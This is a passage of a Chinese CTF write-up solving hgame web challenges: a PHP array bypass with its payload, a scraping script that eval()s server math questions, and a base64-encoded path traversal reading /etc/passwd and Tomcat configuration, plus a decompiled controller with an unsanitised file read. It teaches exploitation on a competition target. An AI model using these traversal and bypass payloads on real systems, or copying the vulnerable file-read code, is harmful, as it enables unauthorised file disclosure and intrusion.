<p>所以整个环节就比较清楚了，使用<code>door[]</code>将<code>$secret</code>置换为<code>NULL</code>，这样我们就可以在本地算出<code>$gate</code>的值了，然后 POST 那个值就行了。</p>
<p>最终用<code>door[]=1&key=98&gate=34047c350a9243401fb31a261407ca367fe058a8f7e00abd10b257e89025ccdd</code>得到 flag : hgame{Php_MayBe_Not_Safe}</p>
<h4 id=baby_spider>Baby_Spider</h4>
<blockquote>
<p>Come to death in the ocean of mathematics together with Li4n0!
Answer 30 questions correctly in a row during 40 seconds(The calculation result is subject to python3),then you can get the flag. Enjoy it~</p>
<p>**hint1:**The most basic operation of a spider is to disguise itself.
**hint2:**Always believe only what you see with your own eyes</p>
</blockquote>
<p>这题很坑很坑&mldr;做得有点生气</p>
<p>首先 1-10 关需要带一些普通请求头访问，否则第十关会直接返回<code>shutdown</code>命令，我没有用管理员直接跑，所以没关机，但是我误以为这是要求<code>python</code>返回值的问题，然后搞了半天发现是需要带一些请求头</p>
<p>然后在 11 关他会修改一个字体的 style ，比如我得到文本为<code>(972279097)/414696815/(472238406)+769794962*(27940524)=?</code>，但是视觉效果却是</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009851.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009851.jpg loading=lazy>
</a>
</figure></p>
<p>字体 style 为</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span>
@font-face {
      font-family: Ariali;
      src: url(&#39;Ariali.otf&#39;);
      font-weight: normal;
      font-style: normal;
}
.question-container{
    font-family: Ariali;
    font-weight: bold;
}
</code></pre></div><p>对应规则为</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>0123456789-&gt;1026943587
</code></pre></div><p>21-30 关又改了 style ，给<code>question-container</code>增加了<code>after</code>元素</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span>
.question-container:after{
    content:&#34;(616887126)-957226796+956719004+554270862+732380290=?&#34;;
}
</code></pre></div><p>所以我们就需要去计算这个 content 中的即可。</p>
<p>把脚本中的 token 替换为自己的 token :</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>re</span>
<span class=kn>import</span> <span class=nn>requests</span>

<span class=n>token_url</span> <span class=o>=</span> <span class=s1>&#39;http://111.231.140.29:10000/&#39;</span>
<span class=n>solution_url</span> <span class=o>=</span> <span class=s1>&#39;http://111.231.140.29:10000/solution&#39;</span>
<span class=n>style_url</span> <span class=o>=</span> <span class=s1>&#39;http://111.231.140.29:10000/statics/style.css&#39;</span>
<span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
<span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#39;</span><span class=p>,</span>
<span class=p>}</span>
<span class=n>dic</span> <span class=o>=</span> <span class=s1>&#39;1026943587&#39;</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
<span class=n>s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>token_url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;token&#39;</span><span class=p>:</span><span class=s1>&#39;BkqnELak3XMzcYsXPZ0DFuXSRf9DLsRW&#39;</span><span class=p>},</span><span class=n>allow_redirects</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
<span class=n>str_text</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;&lt;div class=</span><span class=se>\&#34;</span><span class=s2>question-container</span><span class=se>\&#34;</span><span class=s2>&gt;&lt;span&gt;.*&lt;/span&gt;&lt;/div&gt;&#34;</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>11</span><span class=p>):</span>
    <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
    <span class=c1># if i == 11:</span>
    <span class=c1>#     rep = r.get(style_url)</span>
    <span class=c1>#     print(rep.text)</span>
    <span class=n>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>str_text</span><span class=p>,</span><span class=n>s</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=n>match</span><span class=o>.</span><span class=n>group</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&lt;div class=</span><span class=se>\&#34;</span><span class=s2>question-container</span><span class=se>\&#34;</span><span class=s2>&gt;&lt;span&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=n>result</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;=?&lt;/span&gt;&lt;/div&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>result</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>result</span><span class=p>))</span>
    <span class=n>s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>solution_url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;answer&#39;</span><span class=p>:</span><span class=n>result</span><span class=p>},</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>11</span><span class=p>,</span><span class=mi>21</span><span class=p>):</span>
    <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
    <span class=c1># if i == 21:</span>
    <span class=c1>#     rep = r.get(style_url)</span>
    <span class=c1>#     print(rep.text)</span>
    <span class=n>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>str_text</span><span class=p>,</span><span class=n>s</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=n>match</span><span class=o>.</span><span class=n>group</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;&lt;div class=</span><span class=se>\&#34;</span><span class=s2>question-container</span><span class=se>\&#34;</span><span class=s2>&gt;&lt;span&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=n>result</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;=?&lt;/span&gt;&lt;/div&gt;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=n>tmp</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>result</span><span class=p>)):</span>
        <span class=k>if</span> <span class=nb>ord</span><span class=p>(</span><span class=n>result</span><span class=p>[</span><span class=n>j</span><span class=p>])</span> <span class=o>&gt;</span> <span class=mi>47</span><span class=p>:</span>
            <span class=n>tmp</span> <span class=o>+=</span> <span class=n>dic</span><span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>result</span><span class=p>[</span><span class=n>j</span><span class=p>])]</span>
        <span class=k>else</span><span class=p>:</span>
            <span class=n>tmp</span> <span class=o>+=</span> <span class=n>result</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>
    <span class=n>result</span> <span class=o>=</span> <span class=n>tmp</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>result</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>result</span><span class=p>))</span>
    <span class=n>s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>solution_url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;answer&#39;</span><span class=p>:</span><span class=n>result</span><span class=p>},</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>

<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>21</span><span class=p>,</span><span class=mi>31</span><span class=p>):</span>
    <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
    <span class=c1># if i == 21:</span>
    <span class=c1>#     rep = r.get(style_url)</span>
    <span class=c1>#     print(rep.text)</span>
    <span class=n>s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>style_url</span><span class=p>)</span>
    <span class=n>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s2>&#34;content:</span><span class=se>\&#34;</span><span class=s2>.*=?</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=n>s</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=n>match</span><span class=o>.</span><span class=n>group</span><span class=p>()</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;content:</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=n>result</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;=?</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>result</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
    <span class=n>result</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>result</span><span class=p>))</span>
    <span class=n>s</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>solution_url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;answer&#39;</span><span class=p>:</span><span class=n>result</span><span class=p>},</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
    <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</code></pre></div><p>虽然坑归坑，但是也是能理解作者想表达的反爬虫技术的技巧的想法的</p>
<h4 id=math-有趣>Math 有趣</h4>
<blockquote>
<p>Math is interesting, isn&rsquo;t it?
update: 题中最后的^是乘方，不是 xor
hint: 了解一下 tomcat、spring mvc 的目录结构和配置文件(自己搭一下就明白了
hint2: 图片目录不在 web 目录下</p>
</blockquote>
<p>输入答案 2 之后，进入下一题，发现是个计算&mldr;</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005634.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005634.jpg loading=lazy>
</a>
</figure></p>
<p>我直接放在一旁跑 1-999，然后继续看题，查看源码我们可以发现</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Title<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>It seems that you have learned it, let us do a difficult question.<span class=p>&lt;</span><span class=nt>br</span><span class=p>/&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>/img/cXVlc3Rpb24ucG5n.php</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>/&gt;</span>Show me the smallest integer solutions.<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>br</span><span class=p>/&gt;</span>
<span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;/index.php&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;post&#34;</span><span class=p>&gt;</span>
    Your Answer: <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;answer&#34;</span> <span class=p>/&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span> <span class=p>/&gt;</span>
<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>

</code></pre></div><p>图片文件有些怪异，竟然是个<code>.php</code>后缀，尝试看看文件，发现报错</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009022.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009022.jpg loading=lazy>
</a>
</figure></p>
<p>看来是个<code>base64</code>加密的图片名字格式，<code>atob("cXVlc3Rpb24ucG5n")</code>得到<code>question.png</code></p>
<p>尝试用<code>/img/answer.png.php</code>访问，换了一种报错</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg loading=lazy>
</a>
</figure></p>
<p>猜测是个可以任意文件读取，然后我们用<code>../../../../../etc/passwd</code>经过 base64 编码后加上<code>.php</code>访问，成功得到文件内容，于是猜解目录结构，发现经过<code>../../</code>之后就是根目录。</p>
<p>题目并没有给特别的信息，猜测是个默认目录之类的，既然放在<code>tomcat</code>下，而且也不给其他包名，应该就是类似<code>$TOMCAT_HOME/webapps/ROOT</code>这样的目录，然后加上<code>WEB-INF/web.xml</code>这个比较常用的默认文件来确定位置，最终在<code>../../usr/local/tomcat</code>发现<code>tomcat</code>目录</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>btoa(&#34;../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml&#34;)
&#34;Li4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi93ZWIueG1s&#34;
</code></pre></div><p>得到文件内容</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;!DOCTYPE web-app PUBLIC
</span><span class=cp>        &#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&#34;
</span><span class=cp>        &#34;http://java.sun.com/dtd/web-app_2_3.dtd&#34; &gt;</span>

<span class=nt>&lt;web-app&gt;</span>
    <span class=nt>&lt;display-name&gt;</span>Archetype Created Web Application<span class=nt>&lt;/display-name&gt;</span>
    <span class=nt>&lt;context-param&gt;</span>
        <span class=nt>&lt;param-name&gt;</span>contextConfigLocation<span class=nt>&lt;/param-name&gt;</span>
        <span class=nt>&lt;param-value&gt;</span>classpath:application-context.xml<span class=nt>&lt;/param-value&gt;</span>
    <span class=nt>&lt;/context-param&gt;</span>

    <span class=nt>&lt;listener&gt;</span>
        <span class=nt>&lt;listener-class&gt;</span>org.springframework.web.context.ContextLoaderListener<span class=nt>&lt;/listener-class&gt;</span>
    <span class=nt>&lt;/listener&gt;</span>

    <span class=nt>&lt;servlet&gt;</span>
        <span class=nt>&lt;servlet-name&gt;</span>mathyouqu<span class=nt>&lt;/servlet-name&gt;</span>
        <span class=nt>&lt;servlet-class&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class=nt>&lt;/servlet-class&gt;</span>
    <span class=nt>&lt;/servlet&gt;</span>
    
    <span class=nt>&lt;servlet-mapping&gt;</span>
        <span class=nt>&lt;servlet-name&gt;</span>mathyouqu<span class=nt>&lt;/servlet-name&gt;</span>
        <span class=nt>&lt;url-pattern&gt;</span>*.php<span class=nt>&lt;/url-pattern&gt;</span>
    <span class=nt>&lt;/servlet-mapping&gt;</span>
<span class=nt>&lt;/web-app&gt;</span>
</code></pre></div><p>根据<code>classpath:application-context.xml</code>，访问<code>WEB-INF/classes/application-context.xml</code>得到文件内容</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
<span class=nt>&lt;beans</span> <span class=na>xmlns=</span><span class=s>&#34;http://www.springframework.org/schema/beans&#34;</span>
       <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class=na>xmlns:context=</span><span class=s>&#34;http://www.springframework.org/schema/context&#34;</span>
       <span class=na>xmlns:p=</span><span class=s>&#34;http://www.springframework.org/schema/p&#34;</span>
       <span class=na>xsi:schemaLocation=</span><span class=s>&#34;http://www.springframework.org/schema/beans
</span><span class=s>    http://www.springframework.org/schema/beans/spring-beans.xsd
</span><span class=s>    http://www.springframework.org/schema/context
</span><span class=s>    http://www.springframework.org/schema/context/spring-context.xsd&#34;</span><span class=nt>&gt;</span>

<span class=nt>&lt;/beans&gt;</span>
</code></pre></div><p>但是文件内容对我们接下来要读取的源码并没什么帮助，于是找了很多其他的配置文件都没有找到，最后想起来报错页面应该会有项目文件的名字，也就是之前的那张图：</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007909.jpg loading=lazy>
</a>
</figure></p>
<p>我们可以看到包名<code>hgame.controller</code>，然后<code>MathController</code>就是控制器，对应的就是<code>.class</code>文件，<code>image()</code>对应的就是<code>MathController</code>这个类中的方法。这样从包名我们就可以找到文件路径了，猜测就是<code>hgame/controller/MathController.class</code>，因为是编译好的，所以是<code>.class</code>结尾，而不是<code>.java</code></p>
<p>用<code>JD-GUI</code>打开即可看到源码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=kn>package</span> <span class=nn>hgame.controller</span><span class=o>;</span>

<span class=kn>import</span> <span class=nn>java.io.FileInputStream</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.io.IOException</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.io.InputStream</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.io.OutputStream</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.io.PrintStream</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.util.Base64</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>java.util.Base64.Decoder</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>javax.servlet.http.HttpServletResponse</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>javax.servlet.http.HttpSession</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>org.springframework.stereotype.Controller</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>org.springframework.ui.ModelMap</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>org.springframework.web.bind.annotation.PathVariable</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>org.springframework.web.bind.annotation.RequestMapping</span><span class=o>;</span>
<span class=kn>import</span> <span class=nn>org.springframework.web.bind.annotation.RequestParam</span><span class=o>;</span>

<span class=nd>@Controller</span>
<span class=kd>public</span> <span class=kd>class</span> <span class=nc>MathController</span>
<span class=o>{</span>
  <span class=nd>@RequestMapping</span><span class=o>(</span><span class=n>value</span><span class=o>={</span><span class=s>&#34;/index&#34;</span><span class=o>},</span> <span class=n>method</span><span class=o>={</span><span class=n>org</span><span class=o>.</span><span class=na>springframework</span><span class=o>.</span><span class=na>web</span><span class=o>.</span><span class=na>bind</span><span class=o>.</span><span class=na>annotation</span><span class=o>.</span><span class=na>RequestMethod</span><span class=o>.</span><span class=na>GET</span><span class=o>})</span>
  <span class=kd>public</span> <span class=n>String</span> <span class=nf>index</span><span class=o>(</span><span class=n>ModelMap</span> <span class=n>model</span><span class=o>,</span> <span class=n>HttpSession</span> <span class=n>session</span><span class=o>,</span> <span class=n>HttpServletResponse</span> <span class=n>response</span><span class=o>)</span>
    <span class=kd>throws</span> <span class=n>IOException</span>
  <span class=o>{</span>
    <span class=n>Object</span> <span class=n>step</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=na>getAttribute</span><span class=o>(</span><span class=s>&#34;step&#34;</span><span class=o>);</span>
    <span class=k>if</span> <span class=o>(</span><span class=n>step</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span>
    <span class=o>{</span>
      <span class=n>session</span><span class=o>.</span><span class=na>setAttribute</span><span class=o>(</span><span class=s>&#34;step&#34;</span><span class=o>,</span> <span class=n>Character</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=sc>&#39;1&#39;</span><span class=o>));</span>
      <span class=n>response</span><span class=o>.</span><span class=na>sendRedirect</span><span class=o>(</span><span class=s>&#34;/index.php&#34;</span><span class=o>);</span>
      <span class=k>return</span> <span class=kc>null</span><span class=o>;</span>
    <span class=o>}</span>
    <span class=k>if</span> <span class=o>(</span><span class=n>step</span><span class=o>.</span><span class=na>toString</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;1&#34;</span><span class=o>))</span> <span class=o>{</span>
      <span class=n>model</span><span class=o>.</span><span class=na>addAttribute</span><span class=o>(</span><span class=s>&#34;message&#34;</span><span class=o>,</span> <span class=s>&#34;Welcome to the world of mathematics.&lt;br/&gt;Let&#39;s warm up first.&lt;br/&gt;1+1=?&#34;</span><span class=o>);</span>
    <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>step</span><span class=o>.</span><span class=na>toString</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;2&#34;</span><span class=o>))</span> <span class=o>{</span>
      <span class=n>model</span><span class=o>.</span><span class=na>addAttribute</span><span class=o>(</span><span class=s>&#34;message&#34;</span><span class=o>,</span> <span class=s>&#34;It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions.&#34;</span><span class=o>);</span>
    <span class=o>}</span>
    <span class=k>return</span> <span class=s>&#34;math&#34;</span><span class=o>;</span>
  <span class=o>}</span>
  
  <span class=nd>@RequestMapping</span><span class=o>(</span><span class=n>value</span><span class=o>={</span><span class=s>&#34;/index&#34;</span><span class=o>},</span> <span class=n>method</span><span class=o>={</span><span class=n>org</span><span class=o>.</span><span class=na>springframework</span><span class=o>.</span><span class=na>web</span><span class=o>.</span><span class=na>bind</span><span class=o>.</span><span class=na>annotation</span><span class=o>.</span><span class=na>RequestMethod</span><span class=o>.</span><span class=na>POST</span><span class=o>})</span>
  <span class=kd>public</span> <span class=kt>void</span> <span class=nf>pindex</span><span class=o>(</span><span class=nd>@RequestParam</span><span class=o>(</span><span class=s>&#34;answer&#34;</span><span class=o>)</span> <span class=n>String</span> <span class=n>answer</span><span class=o>,</span> <span class=n>HttpSession</span> <span class=n>session</span><span class=o>,</span> <span class=n>HttpServletResponse</span> <span class=n>response</span><span class=o>)</span>
    <span class=kd>throws</span> <span class=n>IOException</span>
  <span class=o>{</span>
    <span class=n>Object</span> <span class=n>step</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=na>getAttribute</span><span class=o>(</span><span class=s>&#34;step&#34;</span><span class=o>);</span>
    <span class=k>if</span> <span class=o>(</span><span class=n>step</span> <span class=o>==</span> <span class=kc>null</span><span class=o>)</span>
    <span class=o>{</span>
      <span class=n>session</span><span class=o>.</span><span class=na>setAttribute</span><span class=o>(</span><span class=s>&#34;step&#34;</span><span class=o>,</span> <span class=n>Character</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=sc>&#39;1&#39;</span><span class=o>));</span>
      <span class=n>response</span><span class=o>.</span><span class=na>sendRedirect</span><span class=o>(</span><span class=s>&#34;/index.php&#34;</span><span class=o>);</span>
    <span class=o>}</span>
    <span class=k>else</span> <span class=k>if</span> <span class=o>((</span><span class=n>step</span><span class=o>.</span><span class=na>toString</span><span class=o>().</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;1&#34;</span><span class=o>))</span> <span class=o>&amp;&amp;</span> 
      <span class=o>(</span><span class=n>answer</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;2&#34;</span><span class=o>)))</span>
    <span class=o>{</span>
      <span class=n>session</span><span class=o>.</span><span class=na>setAttribute</span><span class=o>(</span><span class=s>&#34;step&#34;</span><span class=o>,</span> <span class=s>&#34;2&#34;</span><span class=o>);</span>
      <span class=n>response</span><span class=o>.</span><span class=na>sendRedirect</span><span class=o>(</span><span class=s>&#34;/index.php&#34;</span><span class=o>);</span>
    <span class=o>}</span>
  <span class=o>}</span>
  
  <span class=nd>@RequestMapping</span><span class=o>(</span><span class=n>value</span><span class=o>={</span><span class=s>&#34;/img/{path}&#34;</span><span class=o>},</span> <span class=n>method</span><span class=o>={</span><span class=n>org</span><span class=o>.</span><span class=na>springframework</span><span class=o>.</span><span class=na>web</span><span class=o>.</span><span class=na>bind</span><span class=o>.</span><span class=na>annotation</span><span class=o>.</span><span class=na>RequestMethod</span><span class=o>.</span><span class=na>GET</span><span class=o>})</span>
  <span class=kd>public</span> <span class=n>String</span> <span class=nf>image</span><span class=o>(</span><span class=nd>@PathVariable</span><span class=o>(</span><span class=s>&#34;path&#34;</span><span class=o>)</span> <span class=n>String</span> <span class=n>path</span><span class=o>,</span> <span class=n>HttpServletResponse</span> <span class=n>response</span><span class=o>)</span>
  <span class=o>{</span>
    <span class=n>path</span> <span class=o>=</span> <span class=k>new</span> <span class=n>String</span><span class=o>(</span><span class=n>Base64</span><span class=o>.</span><span class=na>getDecoder</span><span class=o>().</span><span class=na>decode</span><span class=o>(</span><span class=n>path</span><span class=o>));</span>
    <span class=n>InputStream</span> <span class=n>f</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
    <span class=n>OutputStream</span> <span class=n>out</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
    <span class=k>try</span>
    <span class=o>{</span>
      <span class=n>f</span> <span class=o>=</span> <span class=k>new</span> <span class=n>FileInputStream</span><span class=o>(</span><span class=s>&#34;/home/static/&#34;</span> <span class=o>+</span> <span class=n>path</span><span class=o>);</span>
      <span class=n>out</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>();</span>
      <span class=kt>int</span> <span class=n>count</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span>
      <span class=kt>byte</span><span class=o>[]</span> <span class=n>buffer</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>byte</span><span class=o>[</span><span class=err>&#39;���&#39;</span><span class=o>];</span>
      <span class=k>while</span> <span class=o>((</span><span class=n>count</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=na>read</span><span class=o>(</span><span class=n>buffer</span><span class=o>))</span> <span class=o>!=</span> <span class=o>-</span><span class=n>1</span><span class=o>)</span>
      <span class=o>{</span>
        <span class=n>out</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>buffer</span><span class=o>,</span> <span class=n>0</span><span class=o>,</span> <span class=n>count</span><span class=o>);</span>
        <span class=n>out</span><span class=o>.</span><span class=na>flush</span><span class=o>();</span>
      <span class=o>}</span>
    <span class=o>}</span>
    <span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>e</span><span class=o>)</span>
    <span class=o>{</span>
      <span class=n>e</span><span class=o>.</span><span class=na>printStackTrace</span><span class=o>();</span>
    <span class=o>}</span>
    <span class=k>try</span>
    <span class=o>{</span>
      <span class=n>f</span><span class=o>.</span><span class=na>close</span><span class=o>();</span>
      <span class=n>out</span><span class=o>.</span><span class=na>close</span><span class=o>();</span>
    <span class=o>}</span>
